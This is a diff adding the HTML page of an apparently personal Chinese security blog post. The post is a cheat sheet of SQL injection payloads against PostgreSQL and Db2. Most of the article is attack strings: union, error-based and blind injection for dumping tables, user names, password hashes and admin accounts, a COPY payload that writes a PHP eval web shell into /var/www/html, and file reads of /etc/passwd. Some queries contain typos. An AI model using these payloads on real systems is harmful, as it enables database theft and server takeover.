@@ -1,0 +1,423 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="不同数据库的注入方法(Postgre、Db2)" />
+
+
+<meta name="description" content="今天学习Postgre和Db2的注入方法。
+
+Postgre数据库PostgreSQL默认端口是5432，默认用户名和数据库名都是：postgres，注释符：–, 延时函数：pg_sleep(3..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    不同数据库的注入方法(Postgre、Db2) |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="不同数据库的注入方法(Postgre、Db2)">
+            
+            不同数据库的注入方法(Postgre、Db2)
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Postgre%E3%80%81Db2/" rel="tag">不同数据库的注入方法(Postgre、Db2)</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/04/05</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                341</strong>
+            天之前发表，文中内容可能已经过时。
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>今天学习Postgre和Db2的注入方法。</p>
+<a id="more"></a>
+<h1 id="Postgre数据库"><a href="#Postgre数据库" class="headerlink" title="Postgre数据库"></a>Postgre数据库</h1><p>PostgreSQL默认端口是5432，默认用户名和数据库名都是：postgres，注释符：–, 延时函数：pg_sleep(3)，也有information_schema表。条件判断不是if，而是：</p>
+<pre><code>select casr when(current_user=&apos;postgres&apos;) then pg_sleep(5) else pg_sleep(0) end;</code></pre><h2 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h2><pre><code>select CURRENT_SCHEMA()</code></pre><h2 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h2><pre><code>select user
+select usename from pg_user
+select getpgusername()</code></pre><h2 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h2><pre><code>select current_user
+select session_user
+and 1=cast(current_user || 999 as int)</code></pre><p>cast是转换类型函数。</p>
+<h2 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h2><pre><code>select version()</code></pre><h2 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h2><pre><code>select current_database()
+select datname from pg_database limit 1 offset 0</code></pre><h2 id="查看安装目录"><a href="#查看安装目录" class="headerlink" title="查看安装目录"></a>查看安装目录</h2><pre><code>union SELECT NULL,setting,NULL FROM pg_settings WHERE name=&apos;data_directory&apos;</code></pre><h2 id="将ASCII码转为字符串"><a href="#将ASCII码转为字符串" class="headerlink" title="将ASCII码转为字符串"></a>将ASCII码转为字符串</h2><pre><code>select chr(37)||chr(100)...</code></pre><h2 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h2><h3 id="爆字段数"><a href="#爆字段数" class="headerlink" title="爆字段数"></a>爆字段数</h3><p>同样是order by,然后 union select null,null…注意需要判断字段类型。</p>
+<h3 id="爆当前数据库名"><a href="#爆当前数据库名" class="headerlink" title="爆当前数据库名"></a>爆当前数据库名</h3><pre><code>union select 1,null,current_database() limit 1 offset 0
+union select 1,null,datname from pg_database limit 1 offset 0
+union select 1,null,datname from pg_stat_database limit 1 offset 0</code></pre><p>使用limit 1 offset 1这样遍历。</p>
+<h3 id="爆当前数据库中有管理员权限的用户"><a href="#爆当前数据库中有管理员权限的用户" class="headerlink" title="爆当前数据库中有管理员权限的用户"></a>爆当前数据库中有管理员权限的用户</h3><pre><code>union select null,usename,null,null FROM pg_user WHERE usesuper IS TRUE limit 1 offset 0</code></pre><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><h4 id="爆当前库的表名"><a href="#爆当前库的表名" class="headerlink" title="爆当前库的表名"></a>爆当前库的表名</h4><pre><code>union select 1,null,tablename from pg_tables where schemaname=&apos;public&apos; limit 1 offset 0</code></pre><p>就是使用public，而不是用上面爆的数据库名。</p>
+<h4 id="爆所有用户的表名"><a href="#爆所有用户的表名" class="headerlink" title="爆所有用户的表名"></a>爆所有用户的表名</h4><pre><code>union select 1,null,relname from pg_stat_user_tables limit 1 offset 0</code></pre><h4 id="爆普通表名"><a href="#爆普通表名" class="headerlink" title="爆普通表名"></a>爆普通表名</h4><pre><code>union select 1,null,relname from pg_class where relkind=&apos;r&apos; limit 1 offset 0</code></pre><h4 id="爆表名的oid值"><a href="#爆表名的oid值" class="headerlink" title="爆表名的oid值"></a>爆表名的oid值</h4><pre><code>union select 1,null oid from pg_class where relname=&apos;表名&apos; limit 1 offset 0</code></pre><p>爆出表名的oid值后，需要转换成字符型：  </p>
+<pre><code>union select 1,null cast(oid as varchar(10)） from pg_class where relname=&apos;表名&apos; limit 1 offset 0</code></pre><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><h4 id="与MySQL类似的information-schema"><a href="#与MySQL类似的information-schema" class="headerlink" title="与MySQL类似的information_schema"></a>与MySQL类似的information_schema</h4><pre><code>union select 1,null,column_name from information_schema.columns where table_name=&apos;表名&apos; limit 1 offset 0</code></pre><h4 id="使用表名的oid值"><a href="#使用表名的oid值" class="headerlink" title="使用表名的oid值"></a>使用表名的oid值</h4><pre><code>union select 1,null,attname from pg_attribute where attrelid=表名的oid值 limit 1 offset 0</code></pre><h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3><h4 id="爆当前数据库的表的内容"><a href="#爆当前数据库的表的内容" class="headerlink" title="爆当前数据库的表的内容"></a>爆当前数据库的表的内容</h4><pre><code>union select 1,null,name||password from users</code></pre><p>users是表名。</p>
+<h4 id="直接从pg-shadow爆数据库用户信息"><a href="#直接从pg-shadow爆数据库用户信息" class="headerlink" title="直接从pg_shadow爆数据库用户信息"></a>直接从pg_shadow爆数据库用户信息</h4><pre><code>union select 1,null,username||chr(124)||passwd||usesuper fom pg_shadow limit 1 offset 0</code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><pre><code>and 1=cast((chr(113)||chr(98)||chr(122)||chr(98)||chr(113))||(select coalesce(schemaname as character(10000)),(chr(32))) from pg_tables offset 0 limit 1)::text||(chr(113)||chr(112)||chr(106)||chr(98)||chr(113)) as numeric()</code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><pre><code>and ascii(substring((select coalesce(cast(count(distinct(schemaname)) as character(10000)),(chr(32))) from pg_tables)::text from 1 for 1))&gt;48</code></pre><h3 id="猜当前数据库名长度"><a href="#猜当前数据库名长度" class="headerlink" title="猜当前数据库名长度"></a>猜当前数据库名长度</h3><pre><code>and (select length(current_database())) between 1 and 10</code></pre><p>当然，&gt;&lt;也是可以的。</p>
+<h3 id="猜库名"><a href="#猜库名" class="headerlink" title="猜库名"></a>猜库名</h3><pre><code>and (select ascii(substr(current_database(),1,1)))&gt;1</code></pre><p>同样可以修改猜第二个，第三个…</p>
+<h3 id="猜库中的表的个数"><a href="#猜库中的表的个数" class="headerlink" title="猜库中的表的个数"></a>猜库中的表的个数</h3><pre><code>and (select count(*) from pg_stat_user_tables)&gt;8</code></pre><h3 id="猜表名长度"><a href="#猜表名长度" class="headerlink" title="猜表名长度"></a>猜表名长度</h3><pre><code>and (select length(relname) from pg_stat_user_tables limit 1 offset 0)&gt;4</code></pre><h3 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h3><pre><code>and (select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 offset 0)&gt;20</code></pre><h3 id="才列名个数"><a href="#才列名个数" class="headerlink" title="才列名个数"></a>才列名个数</h3><pre><code>and (select count(*) from information_schema.columns where table_name=&apos;reg_users&apos;)&gt;4</code></pre><h3 id="猜列名长度"><a href="#猜列名长度" class="headerlink" title="猜列名长度"></a>猜列名长度</h3><pre><code>and (select length(column_name) from information_schema.columns where table_name=&apos;表名&apos; limit 1 offset 0)&gt;4</code></pre><h3 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h3><pre><code>and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_name=&apos;表名&apos; limit 1 offset 0)&gt;4</code></pre><h3 id="猜字段内容长度"><a href="#猜字段内容长度" class="headerlink" title="猜字段内容长度"></a>猜字段内容长度</h3><pre><code>and (select length(name) from reg_users limit 1 offset 0)&gt;4</code></pre><p>name是列名，reg_users是表名。</p>
+<h3 id="猜字段内容"><a href="#猜字段内容" class="headerlink" title="猜字段内容"></a>猜字段内容</h3><pre><code>and (select ascii(substr(name,1,1)) from 表名 limit 1 offset 0)&gt;20</code></pre><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><pre><code>and select case when (coalesce(ascii(substr((select current_user),1,1)),0)&gt;100) then pg_sleep(5) else pg_sleep(0) end limit 1</code></pre><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><pre><code>create table test(shell text not null);
+insert into test values(&apos;&lt;?php eval($POST[cmd];?&gt;&apos;)
+copy test(shell) to &apos;/var/www/html/xxx.php&apos;</code></pre><p>直接一句话：  </p>
+<pre><code>copy(select &apos;&lt;?php eval($_POST[cmd];?&gt;&apos;) to &apos;/var/www/html/xxx.php&apos;</code></pre><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><pre><code>create table test1(file text not null);
+copy test1(file) from &apos;/etc/passwd&apos;;
+select * from test1</code></pre><p>或者：</p>
+<pre><code>select pg_read_file(路径)</code></pre><p>更多文件操作函数看：<br><a href="http://blog.sina.com.cn/s/blog_b34174010101gt25.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_b34174010101gt25.html</a></p>
+<p>参考文章：<br><a href="https://www.cnblogs.com/KevinGeorge/p/8446874.html" target="_blank" rel="noopener">https://www.cnblogs.com/KevinGeorge/p/8446874.html</a><br><a href="https://blog.csdn.net/p656456564545/article/details/42466633" target="_blank" rel="noopener">https://blog.csdn.net/p656456564545/article/details/42466633</a><br><a href="https://www.bbsmax.com/A/n2d9gmOQJD/" target="_blank" rel="noopener">https://www.bbsmax.com/A/n2d9gmOQJD/</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/104628797" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/104628797</a> </p>
+<h1 id="Db2数据库"><a href="#Db2数据库" class="headerlink" title="Db2数据库"></a>Db2数据库</h1><h2 id="爆数据库版本"><a href="#爆数据库版本" class="headerlink" title="爆数据库版本"></a>爆数据库版本</h2><pre><code>select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
+select versionnurober,version_timestamp from sysibm.sysversions（这句未成功）</code></pre><h2 id="爆当前用户"><a href="#爆当前用户" class="headerlink" title="爆当前用户"></a>爆当前用户</h2><pre><code>select user from sysibm.sysdummy1
+select session_user from sysibm.sysdummy1
+select system_user from sysibm.sysdummy1</code></pre><h2 id="爆当前用户的权限"><a href="#爆当前用户的权限" class="headerlink" title="爆当前用户的权限"></a>爆当前用户的权限</h2><pre><code>select * from syscat.tabauthwhere grantee=current_user</code></pre><h2 id="获取数据库权限"><a href="#获取数据库权限" class="headerlink" title="获取数据库权限"></a>获取数据库权限</h2><pre><code>select * from syscat.tabauth</code></pre><h2 id="爆数据库的管理员账户"><a href="#爆数据库的管理员账户" class="headerlink" title="爆数据库的管理员账户"></a>爆数据库的管理员账户</h2><pre><code>select distinct(grantee) from sysibm.systabauth where controlauth=&apos;Y&apos;</code></pre><p>未成功</p>
+<h2 id="爆数据库所在主机相关信息"><a href="#爆数据库所在主机相关信息" class="headerlink" title="爆数据库所在主机相关信息"></a>爆数据库所在主机相关信息</h2><pre><code>select * from sysibmadm.env_sys_info</code></pre><h2 id="爆当前数据库"><a href="#爆当前数据库" class="headerlink" title="爆当前数据库"></a>爆当前数据库</h2><pre><code>select current schema from sysibm.sysdummy1</code></pre><p>GAMETASK</p>
+<h2 id="爆当前数据库的表"><a href="#爆当前数据库的表" class="headerlink" title="爆当前数据库的表"></a>爆当前数据库的表</h2><pre><code>select table_name from sysibm.tables
+select name from sysibm.systables</code></pre><p>ADMINTABCOMPRESSINFO</p>
+<pre><code>select current server from sysibm.sysdummy1</code></pre><p>这条不知道是啥。可能是其它数据库的表？</p>
+<h3 id="返回所有用户创建的表名"><a href="#返回所有用户创建的表名" class="headerlink" title="返回所有用户创建的表名"></a>返回所有用户创建的表名</h3><pre><code>select name from sysibm.systables where creator=user</code></pre><h3 id="返回第一条记录"><a href="#返回第一条记录" class="headerlink" title="返回第一条记录"></a>返回第一条记录</h3><pre><code>select name from sysibm.systables where creator=user fetch first 1 rows only</code></pre><p>GAME_CHARACTER<br>返回第一条记录，类似top 1</p>
+<h2 id="爆当前数据库的列名"><a href="#爆当前数据库的列名" class="headerlink" title="爆当前数据库的列名"></a>爆当前数据库的列名</h2><pre><code>select name,tbname,coltype from sysibm.syscolumns
+select colname from syscat.columns where name=&apos;table_name&apos;（未成功）
+select name from sysibm.syscolumns where tbcreator=&apos;&apos; and tbname=&apos;&apos;</code></pre><p>ACCESSCTRLAUTH</p>
+<h2 id="union联合注入-1"><a href="#union联合注入-1" class="headerlink" title="union联合注入"></a>union联合注入</h2><h3 id="爆字段数-1"><a href="#爆字段数-1" class="headerlink" title="爆字段数"></a>爆字段数</h3><p>同样是order by，然后union select 1,2,3… from syscat.tables看返回那个字段。注意，必须要跟一个存在的表。</p>
+<h3 id="爆当前数据库-1"><a href="#爆当前数据库-1" class="headerlink" title="爆当前数据库"></a>爆当前数据库</h3><pre><code>union select 1,2,current schema,4 from sysibm.sysdummy1</code></pre><h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code>union select 1,2,name,4 from sysibm.systables where creator=user fetch first 1 rows only
+union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1</code></pre><h3 id="爆列名-1"><a href="#爆列名-1" class="headerlink" title="爆列名"></a>爆列名</h3><pre><code>union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1</code></pre><p>通过limit 1,1爆其它列。</p>
+<h3 id="爆字段数据"><a href="#爆字段数据" class="headerlink" title="爆字段数据"></a>爆字段数据</h3><pre><code>union select 1,NAME,PASSWORD,4 from GAME_CHARACTER limit 1,1</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="猜用户名字长度"><a href="#猜用户名字长度" class="headerlink" title="猜用户名字长度"></a>猜用户名字长度</h3><pre><code>and (select length(rtrim(user)) from sysibm.sysdummy1)&gt;4</code></pre><h3 id="猜用户名"><a href="#猜用户名" class="headerlink" title="猜用户名"></a>猜用户名</h3><pre><code>and (select ascii(substr(rtrim(user),1,1)) from sysibm.sysdummy1)&gt;99</code></pre><h3 id="爆当前数据库名长度"><a href="#爆当前数据库名长度" class="headerlink" title="爆当前数据库名长度"></a>爆当前数据库名长度</h3><pre><code>and (select length(rtrim(current schema)) from sysibm.sysdummy1)&gt;6</code></pre><h3 id="爆当前数据库名-1"><a href="#爆当前数据库名-1" class="headerlink" title="爆当前数据库名"></a>爆当前数据库名</h3><pre><code>and (select ascii(substr(rtrim(current schema),1,1)) from sysibm.sysdummy1)&gt;99</code></pre><h3 id="猜用户表的数量"><a href="#猜用户表的数量" class="headerlink" title="猜用户表的数量"></a>猜用户表的数量</h3><pre><code>and (select count(name) from sysibm.systables where creator=user)&gt;0</code></pre><p>或者：</p>
+<pre><code>and (select count(name) from syscat.tables where tabschema=current schema limit 0,1)&gt;0</code></pre><h3 id="猜表的长度"><a href="#猜表的长度" class="headerlink" title="猜表的长度"></a>猜表的长度</h3><pre><code>and (select length(name) from sysibm.systables where creator=user fetch first 1 rows only)&gt;0
+and (select length(name) from sysibm.systables where creator=user and name not in(&apos;爆出的第一个表名&apos;) fetch first 1 rows only)&gt;0</code></pre><p>或者：</p>
+<pre><code>and (select length(name) from syscat.tables where tabschema=current schema limit 0,1)&gt;0</code></pre><h3 id="猜表名-1"><a href="#猜表名-1" class="headerlink" title="猜表名"></a>猜表名</h3><pre><code>and (select ascii(substr(name,1,1)) from sysibm.systables where creator=user fetch first 1 rows only)&gt;0
+and (select ascii(substr(name,1,1)) from sysibm.systables where creator=user and name not in(&apos;爆出的第一个表名&apos;) fetch first 1 rows only)&gt;0</code></pre><p>或者：</p>
+<pre><code>and (select ascii(substr(name,1,1)) from syscat.tables where tabschema=current schema limit 0,1)&gt;0</code></pre><p>通过limit 1,1爆其它表名。</p>
+<h3 id="猜列名数量"><a href="#猜列名数量" class="headerlink" title="猜列名数量"></a>猜列名数量</h3><pre><code>and (select count(column_name) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1)&gt;0</code></pre><h3 id="猜列名长度-1"><a href="#猜列名长度-1" class="headerlink" title="猜列名长度"></a>猜列名长度</h3><pre><code>and (select length(column_name) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1)&gt;0
+and (select length(column_name) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 1,1)&gt;0</code></pre><h3 id="猜列名-1"><a href="#猜列名-1" class="headerlink" title="猜列名"></a>猜列名</h3><pre><code>and (select ascii(substr(column_name,1,1)) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 0,1)&gt;0
+and (select ascii(substr(column_name,1,1)) from sysibm.columns where table_schema=current schema and table_name=&apos;GAME_CHARACTER&apos; limit 1,1)&gt;0</code></pre><h3 id="猜字段内容长度-1"><a href="#猜字段内容长度-1" class="headerlink" title="猜字段内容长度"></a>猜字段内容长度</h3><pre><code>and (select length(PASSWORD) from 表名 limit 0,1)&gt;0</code></pre><h3 id="猜字段内容-1"><a href="#猜字段内容-1" class="headerlink" title="猜字段内容"></a>猜字段内容</h3><pre><code>and (select ascii(substr(PASSWORD,1,1)) from 表名 limit 0,1)&gt;0
+and (select ascii(substr(PASSWORD,1,1)) from 表名 limit 0,1)&gt;0</code></pre><p>参考文章：<br><a href="https://www.csdn.net/gather_2a/MtTaAg5sNzMyMC1ibG9n.html" target="_blank" rel="noopener">https://www.csdn.net/gather_2a/MtTaAg5sNzMyMC1ibG9n.html</a><br><a href="http://www.520ve.com/2315.html" target="_blank" rel="noopener">http://www.520ve.com/2315.html</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/04/06/python%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="pre-post btn btn-default" title='python小知识'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            python小知识</span>
+    </a>
+    
+    
+    <a href="/2020/04/02/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Oracle%E3%80%81Sqlite/" class="next-post btn btn-default" title='不同数据库的注入方法(Oracle、Sqlite)'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            不同数据库的注入方法(Oracle、Sqlite)</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Postgre数据库"><span class="toc-text">Postgre数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看当前用户权限"><span class="toc-text">查看当前用户权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看用户"><span class="toc-text">查看用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看当前用户"><span class="toc-text">查看当前用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看版本信息"><span class="toc-text">查看版本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看当前数据库"><span class="toc-text">查看当前数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看安装目录"><span class="toc-text">查看安装目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#将ASCII码转为字符串"><span class="toc-text">将ASCII码转为字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union联合注入"><span class="toc-text">union联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段数"><span class="toc-text">爆字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆当前数据库名"><span class="toc-text">爆当前数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆当前数据库中有管理员权限的用户"><span class="toc-text">爆当前数据库中有管理员权限的用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表名"><span class="toc-text">爆表名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#爆当前库的表名"><span class="toc-text">爆当前库的表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#爆所有用户的表名"><span class="toc-text">爆所有用户的表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#爆普通表名"><span class="toc-text">爆普通表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#爆表名的oid值"><span class="toc-text">爆表名的oid值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆列名"><span class="toc-text">爆列名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#与MySQL类似的information-schema"><span class="toc-text">与MySQL类似的information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用表名的oid值"><span class="toc-text">使用表名的oid值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段内容"><span class="toc-text">爆字段内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#爆当前数据库的表的内容"><span class="toc-text">爆当前数据库的表的内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#直接从pg-shadow爆数据库用户信息"><span class="toc-text">直接从pg_shadow爆数据库用户信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#布尔盲注"><span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#猜当前数据库名长度"><span class="toc-text">猜当前数据库名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜库名"><span class="toc-text">猜库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜库中的表的个数"><span class="toc-text">猜库中的表的个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜表名长度"><span class="toc-text">猜表名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜表名"><span class="toc-text">猜表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#才列名个数"><span class="toc-text">才列名个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜列名长度"><span class="toc-text">猜列名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜列名"><span 